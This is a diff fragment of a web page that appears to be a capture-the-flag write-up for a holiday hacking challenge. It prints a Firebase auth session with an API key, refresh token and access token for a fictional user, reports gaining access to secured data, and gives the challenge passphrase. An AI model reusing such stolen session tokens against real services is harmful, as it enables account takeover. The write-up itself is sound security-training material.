+<p><code>firebase:authUser:AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk:[DEFAULT] :"{"fbase_key":"firebase:authUser:AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk:[DEFAULT]","value":{"uid":"3loaihgxP0VwCTKmkHHFLe6FZ4m2","email":"barnabybriefcase@gnomemail.dosis","emailVerified":true,"displayName":"Barnaby Briefcase","isAnonymous":false,"providerData":[{"providerId":"password","uid":"barnabybriefcase@gnomemail.dosis","displayName":"Barnaby Briefcase","email":"barnabybriefcase@gnomemail.dosis","phoneNumber":null,"photoURL":null}],"stsTokenManager":{"refreshToken":"AMf-vByq4902_YbTlqMlR1bveDQPp3RxD6UIvQkVuJIO7-wpydiarQo3neDHFOCLgZwNRjw5YJcqXq6Gut3NrE2tJKvX5MJOzb0Tux0-cdJV2dT5sX2_7oUh3oDCVv1P1CB_idoKROsKlzV6pF_7Bloc_8lVMao3B-UxdlY9JFLHfAlIAYjCtEztnavrgG_23C1x9ZPFubm9PBNNm_DrsrBX0wtCs5euGQAKMQzK9p00Y_14g7kaBoAaUl1yC-HUFEGEKGJwDjME","accessToken":"eyJhbGciOiJSUzI1NiIsImtpZCI6IjM4MTFiMDdmMjhiODQxZjRiNDllNDgyNTg1ZmQ2NmQ1NWUzOGRiNWQiLCJ0eXAiOiJKV1QifQ.eyJuYW1lIjoiQmFybmFieSBCcmllZmNhc2UiLCJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vaG9saWRheWhhY2syMDI1IiwiYXVkIjoiaG9saWRheWhhY2syMDI1IiwiYXV0aF90aW1lIjoxNzY1OTQxODM2LCJ1c2VyX2lkIjoibDdWUzAxSzlHS1Y1aXI1UzhzdURjd09GRXBwMiIsInN1YiI6Imw3VlMwMUs5R0tWNWlyNVM4c3VEY3dPRkVwcDIiLCJpYXQiOjE3NjU5NDE4MzYsImV4cCI6MTc2NTk0NTQzNiwiZW1haWwiOiJiYXJuYWJ5YnJpZWZjYXNlQGdub21lbWFpbC5kb3NpcyIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJmaXJlYmFzZSI6eyJpZGVudGl0aWVzIjp7ImVtYWlsIjpbImJhcm5hYnlicmllZmNhc2VAZ25vbWVtYWlsLmRvc2lzIl19LCJzaWduX2luX3Byb3ZpZGVyIjoicGFzc3dvcmQifX0.BqZ9Pr9ITyqCB4g2gt5dSkHJa-xD4GrdhV5UdNOBsJKsmxgCikTPXzvhEP4sEmtnZcuaYnCHSC_AxaWdRcGQnvkmntnKjTrru7hGvpwBPtqwedpYg2VnIJY6Nd97hbBBL5FscMzM01wEMZobbXnaoZT-ES1Rbx7FL4F2F4uePcABnRDFfII7HBp-CW36In_N-B_TzoNf1va72RwP12EB1NMUMFu9wlCJ9vZB4lALn9IwVrm7qcUuUiOBjvzOdHadHcr2EZSgq_cU9F0W60FclCB8p8MYw46bJLW18McKA4HES5E3Cqs8hErM0GhqrmxTecx5rCcLEpfKlrl8rgammw","expirationTime":1765945435581},"createdAt":"1759256487470","lastLoginAt":"1765941836122","apiKey":"AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk","appName":"[DEFAULT]"}}"</code><br/></p>
+<p>It works! We have now access to the secured information.<br/></p>
+<h3 id="solution_1">Solution<a class="headerlink" href="#solution_1" title="Permanent link">⚓︎</a></h3>
+<p>Passphrase: <strong>GigGigglesGiggler</strong></p>
+<p><img alt="Terminal output" src="../../img/objectives/o18/o18_20.png" /></p>
+<p><img alt="Terminal output" src="../../img/objectives/o18/o18_21.png" /></p>
 
 
 
 
 
 
+
+  
+  
 
 
 
@@ -1275,14 +1417,14 @@ It is more of a step by step process to record my thought process, rather than a
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": ".", "features": ["toc.integrate", "content.code.copy", "navigation.sections"], "search": "assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["toc.integrate", "content.code.copy", "navigation.sections"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
       
         <script src="https://cdnjs.cloudflare.com/ajax/libs/tablesort/5.2.1/tablesort.min.js"></script>
       
-        <script src="js/tablesort.js"></script>
+        <script src="../../js/tablesort.js"></script>
       
     
   </body>
